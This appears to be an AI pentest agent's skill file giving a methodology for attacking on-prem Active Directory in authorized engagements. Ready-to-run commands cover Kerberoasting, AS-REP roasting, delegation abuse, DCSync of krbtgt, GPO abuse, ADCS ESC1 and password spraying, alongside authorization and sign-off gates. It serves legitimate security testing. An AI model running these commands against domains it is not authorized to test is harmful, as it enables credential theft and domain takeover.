---
name: active-directory
description: >
  On-prem Active Directory attack methodology for authorized engagements:
  BloodHound graph enumeration, Kerberoasting, AS-REP roasting, DCSync,
  delegation abuse (unconstrained/constrained/RBCD), GPO abuse, and
  domain privilege escalation paths. Keywords: Active Directory, AD,
  Kerberos, BloodHound, Kerberoasting, AS-REP, DCSync, delegation, GPO,
  domain admin, NTLM relay. Do NOT use for Azure AD / Entra ID cloud-only
  tenants (see azure-attack), or for single-host Windows privesc with no
  domain context (see windows-privesc).
metadata:
  type: platform
  phase: hunting
  tools: [bloodhound, impacket, rubeus, mimikatz, crackmapexec, netexec, powerview, certipy]
depends_on: [network-infra, windows-privesc]
feeds_into: [chain-analysis, privesc-report, domain-admin-report]
chains_with: [windows-privesc, network-infra, linux-privesc]
---

## Signals
- Internal network with Kerberos (TCP/UDP 88), LDAP (389/636), SMB (445) reachable.
- A foothold (any domain-joined host, even low-priv) or valid domain credentials from phishing/initial access.
- `whoami /fqdn` or `nltest /dsgetdc:` on a compromised host confirms domain membership.

## Prerequisites
- Written authorization explicitly covering "Active Directory domain" / "internal network" testing, not just external web assets — AD testing is inherently disruptive-adjacent (password spraying can lock accounts).
- At least one domain-joined foothold OR one valid domain credential (even a guest/low-priv service account).
- `Impacket`, `BloodHound` (CE) + Neo4j, `Rubeus`, `mimikatz`, `NetExec` (successor to crackmapexec), `PowerView`/`PowerSploit`, `certipy` for ADCS.

## Methodology

### 1. Unauthenticated/low-priv enumeration
```bash
# Null session / anonymous LDAP check
netexec smb target-dc.target.local -u '' -p '' --shares
nxc ldap target-dc.target.local -u '' -p ''

# Domain user enumeration via Kerberos (no creds needed for AS-REP pre-auth check)
kerbrute userenum --dc target-dc.target.local -d target.local userlist.txt
```

### 2. Collect the graph
```bash
# SharpHound / BloodHound.py collection (needs valid creds)
bloodhound-python -u lowpriv -p 'Password1' -d target.local -ns 10.10.10.10 -c All
# Load the .json output into BloodHound CE and query:
#   Shortest Paths to Domain Admins
#   Kerberoastable users
#   Unconstrained delegation computers
```

### 3. Kerberoasting
```bash
impacket-GetUserSPNs target.local/lowpriv:'Password1' -dc-ip 10.10.10.10 -request -outputfile roast.txt
hashcat -m 13100 roast.txt /usr/share/wordlists/rockyou.txt
```

### 4. AS-REP roasting (accounts with "Do not require Kerberos preauthentication")
```bash
impacket-GetNPUsers target.local/ -usersfile userlist.txt -no-pass -dc-ip 10.10.10.10 -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### 5. Delegation abuse
```bash
# Unconstrained delegation: wait for/coerce a DA to auth, then extract their TGT from memory
Rubeus.exe monitor /interval:5 /filteruser:DomainAdmin
# Constrained delegation abuse (S4U2Self/S4U2Proxy)
impacket-getST -spn cifs/target-fileserver.target.local -impersonate Administrator target.local/svc-delegated:'Password1'
# Resource-Based Constrained Delegation (RBCD) — requires write access to a computer object's msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'TARGET-SRV$' -delegate-from 'attacker-controlled-pc$' -action write target.local/user:'Password1'
```

### 6. DCSync (requires Replicating Directory Changes rights)
```bash
impacket-secretsdump target.local/da-equiv-user:'Password1'@target-dc.target.local -just-dc-ntlm
# or via mimikatz on a foothold with the right rights
mimikatz # lsadump::dcsync /domain:target.local /user:target\krbtgt
```

### 7. GPO abuse (write access to a GPO linked to a privileged OU)
```bash
# Identify via BloodHound: GenericWrite/WriteDacl on a GPO object
# Use SharpGPOAbuse or pyGPOAbuse to add an immediate scheduled task / startup script
SharpGPOAbuse.exe --AddComputerTask --TaskName "update" --Author target\\Administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators lowpriv /add" --GPOName "Vulnerable GPO"
gpupdate /force   # on the target (or wait for scheduled refresh)
```

### 8. ADCS (certificate services) abuse if present
```bash
certipy find -u lowpriv@target.local -p 'Password1' -dc-ip 10.10.10.10 -vulnerable
# ESC1 example: template allows requester-supplied SAN
certipy req -u lowpriv@target.local -p 'Password1' -ca target-CA -template VulnTemplate -upn administrator@target.local
```

### 9. Password spraying (rate-limited, lockout-aware)
```bash
netexec smb target.local -u users.txt -p 'Spring2024!' --continue-on-success
# ALWAYS check lockout policy first
netexec smb target-dc.target.local -u lowpriv -p 'Password1' --pass-pol
```

## Tooling
`BloodHound CE` + `SharpHound`/`bloodhound-python`, `Impacket` suite, `Rubeus`, `mimikatz`, `NetExec`, `PowerView`, `certipy`, `kerbrute`, `hashcat`.

## Validation Gate
- Kerberoast/AS-REP hashes are **Inferred** findings until actually cracked or confirmed usable (hash extraction alone doesn't prove a weak password) — label accordingly per project CLAUDE.md evidence rules.
- DCSync / delegation abuse must be demonstrated end-to-end (actual TGT/ticket obtained and actually used to access a resource as the target principal), not just "BloodHound shows the edge."
- Record the exact LDAP/Kerberos query or tool output with timestamp for every edge exploited.

## Gotchas
- Password spraying WILL lock out accounts if you don't check the lockout threshold first — this is a human gate per project rules (destructive/stateful action on target).
- `krbtgt` DCSync is the most sensitive single action in an AD engagement (enables Golden Ticket for persistent domain compromise) — confirm explicit operator sign-off before executing, even if technically in scope.
- BloodHound "shortest path" edges can be stale if ACLs changed since collection — re-verify the actual ACL/right before exploiting, especially on a multi-day engagement.
- AS-REP roasting only works on accounts with preauth disabled — don't assume all users are roastable.
- Clock skew >5 min between attacker and DC breaks Kerberos ticket requests — sync time first (`ntpdate` or `rdate`).
